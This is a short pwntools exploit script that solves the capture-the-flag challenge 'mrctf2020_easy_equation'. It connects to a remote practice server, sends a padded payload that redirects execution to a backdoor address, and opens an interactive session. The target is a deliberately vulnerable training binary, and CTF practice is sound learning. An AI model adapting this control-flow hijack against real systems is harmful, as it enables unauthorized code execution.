from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('mrctf2020_easy_equation')
io = remote('node4.buuoj.cn', 26386)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('mrctf2020_easy_equation')

backdoor = 0x4006D0
payload = cyclic(9) + p64(backdoor)
io.sendline(payload)
io.interactive()
